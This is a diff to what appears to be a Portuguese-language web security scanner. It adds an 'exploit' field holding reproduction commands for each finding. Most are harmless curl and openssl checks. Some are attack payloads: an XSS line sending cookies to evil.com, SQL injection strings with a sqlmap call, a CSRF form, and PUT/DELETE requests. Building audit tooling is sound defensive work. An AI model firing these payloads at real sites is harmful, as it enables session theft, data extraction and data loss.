@@ -247,6 +247,7 @@ class Finding:
     item: str
     evidence: str
     recommendation: str
+    exploit: str = ""
 
 
 @dataclass(frozen=True)
@@ -698,12 +699,16 @@ def build_findings(
             "high", "transport", "HTTP sem TLS",
             "A pagina principal respondeu sem HTTPS.",
             "Force HTTPS, redirecione HTTP para HTTPS e use HSTS.",
+            f"curl -v {url}\n"
+            f"Mitigacao: configure HTTPS + HSTS header:\n"
+            f"  Strict-Transport-Security: max-age=31536000; includeSubDomains",
         ))
     elif not tls_subject:
         findings.append(Finding(
             "medium", "transport", "TLS nao validado pela ferramenta",
             "Nao foi possivel coletar certificado TLS.",
             "Verifique validade, cadeia, hostname e protocolos aceitos.",
+            f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -servername {parsed.hostname} </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer",
         ))
 
     if tls_versions:
@@ -713,22 +718,27 @@ def build_findings(
                 "high", "transport", f"Versao TLS obsoleta: {tv.protocol}",
                 f"{tv.protocol} esta habilitado no servidor.",
                 f"Desabilite {tv.protocol} e use no minimo TLS 1.2.",
+                f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -{tv.protocol.lower().replace(' ', '').replace('.', '')} </dev/null 2>/dev/null",
             ))
 
     for header, recommendation in SECURITY_HEADERS_RECS.items():
         if header not in lower_headers:
+            exploit_cmd = f"curl -I {url} 2>/dev/null | grep -i '{header}'"
             findings.append(Finding(
                 "medium", "headers", f"Header ausente: {header}",
                 "Header nao apareceu na resposta principal.",
                 recommendation,
+                exploit_cmd,
             ))
 
     server = header_get(headers, "server")
     powered_by = header_get(headers, "x-powered-by")
     if server:
-        findings.append(Finding("low", "fingerprint", "Server exposto", server, "Reduza versao/banner quando possivel."))
+        findings.append(Finding("low", "fingerprint", "Server exposto", server, "Reduza versao/banner quando possivel.",
+                                f"curl -I {url} 2>/dev/null | grep -i server"))
     if powered_by:
-        findings.append(Finding("low", "fingerprint", "X-Powered-By exposto", powered_by, "Remova o header para reduzir fingerprinting."))
+        findings.append(Finding("low", "fingerprint", "X-Powered-By exposto", powered_by, "Remova o header para reduzir fingerprinting.",
+                                f"curl -I {url} 2>/dev/null | grep -i x-powered-by"))
 
     cors = header_get(headers, "access-control-allow-origin")
     if cors == "*":
@@ -736,6 +746,9 @@ def build_findings(
             "medium", "cors", "CORS permissivo",
             "Access-Control-Allow-Origin: *",
             "Restrinja origens permitidas e revise credenciais CORS.",
+            f"curl -H \"Origin: http://evil.com\" -I {url} 2>/dev/null | grep -i access-control\n"
+            f"# Teste com credenciais:\n"
+            f"curl -H \"Origin: http://evil.com\" -H \"Cookie: session=abc\" {url}",
         ))
 
     cookies = (raw_headers or {}).get("set-cookie", [])
@@ -747,14 +760,22 @@ def build_findings(
                 "medium", "cookies", "Cookie sem flags fortes",
                 f"faltando: {', '.join(missing)}",
                 "Use Secure, HttpOnly e SameSite em cookies sensiveis.",
+                f"curl -v {url} 2>&1 | grep -i set-cookie\n"
+                f"Cookie detectado: {cookie[:60]}...",
             ))
 
     dangerous_methods = [method for method in methods if method in {"PUT", "DELETE", "TRACE", "CONNECT"}]
     if dangerous_methods:
+        curl_examples = "\n".join(
+            f"  curl -X {m} {url}/test -d 'test'" if m in {"PUT", "DELETE"}
+            else f"  curl -X {m} {url}"
+            for m in dangerous_methods
+        )
         findings.append(Finding(
             "high", "methods", "Metodos HTTP perigosos habilitados",
             ", ".join(dangerous_methods),
             "Desabilite metodos nao usados no servidor, proxy e aplicacao.",
+            curl_examples,
         ))
 
     if parser.password_inputs and parsed.scheme == "http":
@@ -762,12 +783,16 @@ def build_findings(
             "critical", "auth", "Senha em pagina sem HTTPS",
             f"{parser.password_inputs} campo(s) password detectado(s).",
             "Nunca sirva formularios de autenticacao via HTTP.",
+            f"curl -I {url} 2>/dev/null | grep -i 'type=\"password\"'\n"
+            f"# Credenciais serao transmitidas em claro! Interceptacao trivial com mitmproxy/tcpdump.",
         ))
     elif parser.password_inputs:
         findings.append(Finding(
             "info", "auth", "Formulario de login detectado",
             f"{parser.password_inputs} campo(s) password detectado(s).",
             "Revise MFA, rate limit, lockout e protecao contra credential stuffing.",
+            f"curl -s {url} | grep -i type=.password.\n"
+            f"# Verifique protecao contra brute force (rate limit, lockout, CAPTCHA).",
         ))
 
     if parser.comments:
@@ -775,6 +800,8 @@ def build_findings(
             "low", "content", "Comentarios HTML presentes",
             parser.comments[0],
             "Remova comentarios com detalhes internos, rotas, tokens ou tecnologia.",
+            f"curl -s {url} | grep -o '<!--.*-->'\n"
+            f"# Inspecione o codigo fonte no browser (Ctrl+U) para ver todos os comentarios.",
         ))
 
     sensitive_hits = [
@@ -783,10 +810,22 @@ def build_findings(
     ]
     for probe in sensitive_hits:
         severity = "high" if probe.status == 200 else "medium"
+        exploit_cmd = f"curl -s {probe.url}"
+        if ".env" in probe.url:
+            exploit_cmd += "\n# Possivel vazamento de chaves secretas, DB credentials, API keys"
+        elif ".git" in probe.url:
+            exploit_cmd += "\n# Possivel source code disclosure: git clone/extract do repositorio"
+        elif "dump" in probe.url or "backup" in probe.url:
+            exploit_cmd += "\n# Possivel vazamento de banco de dados ou codigo fonte"
+        elif "phpinfo" in probe.url:
+            exploit_cmd += "\n# Informacoes detalhadas do servidor: modulos, configs, paths"
+        elif "actuator" in probe.url:
+            exploit_cmd += "\n# Spring Boot Actuator: endpoints de gerenciamento expostos"
         findings.append(Finding(
             severity, "exposure", "Endpoint/arquivo sensivel exposto",
             f"{probe.status} {probe.url}",
             "Remova arquivos sensiveis do webroot e restrinja endpoints administrativos.",
+            exploit_cmd,
         ))
 
     if 500 <= status < 600:
@@ -794,6 +833,8 @@ def build_findings(
             "medium", "stability", "Erro 5xx na pagina principal",
             f"HTTP {status}",
             "Investigue logs e tratamento de erro para evitar vazamento e indisponibilidade.",
+            f"curl -v {url}\n"
+            f"# Verifique se a resposta contem stack traces ou informacoes internas.",
         ))
 
     if xss_reflected:
@@ -801,6 +842,11 @@ def build_findings(
             "high", "xss", "Entrada refletida sem sanitizacao",
             xss_evidence,
             "Use encoding de saida (HTML entities) e CSP para mitigar XSS refletido.",
+            f"# Payload basico:\n"
+            f"curl \"{url}/?q=<script>alert(1)</script>\"\n"
+            f"# Payload de exfiltracao:\n"
+            f"curl \"{url}/?q=<script>document.location='http://evil.com/?c='+document.cookie</script>\"\n"
+            f"# Verifique se o navegador executa o script.",
         ))
 
     if sqli_databases:
@@ -808,6 +854,13 @@ def build_findings(
             "critical", "sqli", "Possivel injecao SQL (error-based)",
             f"Banco detectado: {', '.join(sqli_databases)}",
             "Use queries parametrizadas/prepared statements e validacao de entrada.",
+            f"# Payloads de deteccao:\n"
+            f"  curl \"{url}/?id=1'\"\n"
+            f"  curl \"{url}/?id=1' OR '1'='1\"\n"
+            f"  curl \"{url}/?id=1 UNION SELECT NULL--\"\n"
+            f"# Extracao de dados (MySQL):\n"
+            f"  curl \"{url}/?id=1' UNION SELECT table_name FROM information_schema.tables--\"\n"
+            f"# Ferramentas: sqlmap -u \"{url}/?id=1\" --dbs",
         ))
 
     missing_csrf = parser.forms_missing_csrf
@@ -816,6 +869,13 @@ def build_findings(
             "medium", "csrf", "Formulario sem token CSRF",
             f"{missing_csrf} formulario(s) POST sem campo CSRF hidden.",
             "Adicione tokens CSRF em todos os formularios que modificam estado.",
+            f"# Inspecione forms no browser (DevTools > Elements)\n"
+            f"# Procure por <input type=\"hidden\" name=\"csrf\" ou similar>\n"
+            f"# CSRF explora via formulário malicioso:\n"
+            f"  <form method=\"POST\" action=\"{url}/endpoint\">\n"
+            f"    <input type=\"hidden\" name=\"param\" value=\"malicious\">\n"
+            f"    <input type=\"submit\">\n"
+            f"  </form>",
         ))
 
     if method_results:
@@ -827,10 +887,16 @@ def build_findings(
                 if mr.method == "TRACE"
                 else "Verifique autenticacao/autorizacao e restrinja metodos nao utilizados."
             )
+            exploit_cmd = f"curl -X {mr.method} {mr.url}"
+            if mr.method == "PUT":
+                exploit_cmd += " -d 'test=1'"
+            elif mr.method == "DELETE":
+                exploit_cmd += "\n# Cuidado: pode deletar dados reais em producao!"
             findings.append(Finding(
                 severity, "methods", f"Metodo {mr.method} aceito",
                 f"{mr.status} {mr.url}",
                 recommendation,
+                exploit_cmd,
             ))
 
         medium_methods = [mr for mr in method_results if mr.status in {200, 201, 204} and mr.method == "PATCH"]
@@ -839,6 +905,7 @@ def build_findings(
                 "medium", "methods", "Metodo PATCH aceito",
                 f"{mr.status} {mr.url}",
                 "Verifique autenticacao/autorizacao e restrinja metodos nao utilizados.",
+                f"curl -X PATCH {mr.url} -d 'field=newvalue'",
             ))
 
     return findings
@@ -1038,6 +1105,9 @@ def print_result(result: AuditResult) -> None:
         print(f"{sev} {color(finding.category.ljust(11), Cyber.GRAY)} {color(finding.item, Cyber.WHITE, Cyber.BOLD)}")
         print(f"         evidencia: {color(finding.evidence, Cyber.YELLOW)}")
         print(f"         defesa:    {color(finding.recommendation, Cyber.GREEN)}")
+        if finding.exploit:
+            for line in finding.exploit.split("\n"):
+                print(f"         exploit:    {color(line, Cyber.RED)}")
 
 
 def _save_audit_output(path: str, result: AuditResult, quiet: bool = False) -> None:
